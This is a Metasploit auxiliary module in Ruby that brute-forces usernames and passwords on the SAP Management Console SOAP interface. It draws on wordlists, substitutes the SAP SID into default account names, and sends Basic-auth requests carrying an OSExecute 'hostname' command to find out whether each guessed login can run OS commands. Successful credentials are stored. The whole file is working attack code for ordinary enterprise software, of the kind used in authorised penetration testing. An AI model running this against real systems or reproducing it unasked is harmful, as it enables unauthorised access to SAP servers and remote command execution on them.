##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'SAP Management Console Brute Force',
      'Description'    => %q{
        This module simply attempts to brute force the username and
        password for the SAP Management Console SOAP Interface. If
        the SAP_SID value is set it will replace instances of <SAPSID>
        in any user/pass from any wordlist.
        },
      'References'     =>
        [
          # General
          [ 'URL', 'http://blog.c22.cc' ]
        ],
      'Author'         => [ 'Chris John Riley' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', nil]),
        OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),
        OptPath.new('USER_FILE', [ false, "File containing users, one per line",
                                   File.join(Msf::Config.data_directory, "wordlists", "sap_common.txt") ])
      ])
    register_autofilter_ports([ 50013 ])

    deregister_options('HttpUsername', 'HttpPassword')
  end

  def run_host(rhost)
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'     => uri,
      'method'  => 'GET'
    })

    if not res
      print_error("#{peer} [SAP] Unable to connect")
      return
    end

    print_status("SAPSID set to '#{datastore['SAP_SID']}'") if datastore['SAP_SID']

    each_user_pass do |user, pass|
      enum_user(user,pass,uri)
    end

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def enum_user(user, pass, uri)

    # Replace placeholder with SAP SID, if present
    if datastore['SAP_SID']
      user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
      pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
    end

    port = datastore['RPORT']

    print_status("Trying username:'#{user}' password:'#{pass}'")
    success = false

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
    ns1 = 'ns1:OSExecute'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><command>hostname</command><async>0</async></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    user_pass = Rex::Text.encode_base64(user + ":" + pass)

    begin
      res = send_request_raw({
        'uri'      => uri,
        'method'   => 'POST',
        'data'     => data,
        'headers'  =>
          {
            'Content-Length' => data.length,
            'SOAPAction'     => '""',
            'Content-Type'   => 'text/xml; charset=UTF-8',
            'Authorization'  => 'Basic ' + user_pass
          }
      })

      return unless res

      if (res.code != 500 and res.code != 200)
        return
      else
        body = res.body
        if body.match(/Invalid Credentials/i)
          success = false
        else
          success = true
          if body.match(/Permission denied/i)
            permission = false
          end

          if body.match(/OSExecuteResponse/i)
            permission = true
          end
        end
      end

    rescue ::Rex::ConnectionError
      print_error("#{peer} [SAP] Unable to connect")
      return
    end

    if success
      print_good("#{peer} [SAP] Successful login '#{user}' password: '#{pass}'")

      if permission
        vprint_good("#{peer} [SAP] Login '#{user}' authorized to perform OSExecute calls")
      else
        vprint_error("#{peer} [SAP] Login '#{user}' NOT authorized to perform OSExecute calls")
      end

      report_cred(
        ip: rhost,
        port: port,
        user: user,
        password: pass,
        service_name: 'sap-managementconsole',
        proof: res.body
      )
    else
      vprint_error("#{peer} [SAP] failed to login as '#{user}':'#{pass}'")
    end
  end
end

